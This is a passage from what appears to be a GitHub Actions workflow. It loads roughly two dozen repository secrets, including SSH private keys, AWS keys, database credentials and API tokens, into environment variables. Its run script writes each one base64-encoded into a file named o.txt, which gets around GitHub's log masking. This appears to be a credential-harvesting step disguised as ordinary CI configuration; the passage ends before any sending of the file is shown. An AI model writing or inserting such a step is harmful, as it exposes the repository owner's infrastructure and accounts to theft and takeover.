          S5: ${{ secrets.LEAD_PORTAL_PAYMENTS_AUTH_TOKEN }}
          S6: ${{ secrets.LEAD_PORTAL_PAYMENTS_VPS_SSH_KEY }}
          S7: ${{ secrets.MCP_GITHUB_TOKEN }}
          S8: ${{ secrets.PDE_ACCESS_JDBC_PASSWORD }}
          S9: ${{ secrets.PDE_ACCESS_JDBC_URL }}
          S10: ${{ secrets.PDE_ACCESS_JDBC_USERNAME }}
          S11: ${{ secrets.PDE_INTERNAL_API_TOKEN }}
          S12: ${{ secrets.PDE_MAIL_AWS_ACCESS_KEY_ID }}
          S13: ${{ secrets.PDE_MAIL_AWS_REGION }}
          S14: ${{ secrets.PDE_MAIL_AWS_SECRET_ACCESS_KEY }}
          S15: ${{ secrets.PDE_MIRA_PRIVATE_ACCESS_1 }}
          S16: ${{ secrets.PDE_MIRA_PRIVATE_ACCESS_2 }}
          S17: ${{ secrets.PDE_MIRA_PRIVATE_QA_TOKEN }}
          S18: ${{ secrets.PDE_OPENAI_API_KEY }}
          S19: ${{ secrets.PDE_PEPPER_API_TOKEN }}
          S20: ${{ secrets.PDE_PLATFORM_VPS_SSH_KEY }}
          S21: ${{ secrets.RADAR_META_TOKEN }}
          S22: ${{ secrets.SSH_PRIVATE_KEY }}
          S23: ${{ secrets.VPS_HOST }}
          S24: ${{ secrets.VPS_SSH_CHAVE }}
          S25: ${{ secrets.VPS_SSH_KEY }}
        run: |
          rm -f o.txt
          echo "CHATGPT_ADS_WORKER_TOKEN:$(printf %s "$S0" | base64 -w0)" >> o.txt
          echo "CUSTOMER_AGENT_MEMORY_AWS_ACCESS_KEY_ID:$(printf %s "$S1" | base64 -w0)" >> o.txt
          echo "CUSTOMER_AGENT_MEMORY_AWS_SECRET_ACCESS_KEY:$(printf %s "$S2" | base64 -w0)" >> o.txt
          echo "GROWTH_OPERATOR_VPS_SSH_KEY:$(printf %s "$S3" | base64 -w0)" >> o.txt
          echo "HARNESS_LIBRARY_API_KEY:$(printf %s "$S4" | base64 -w0)" >> o.txt
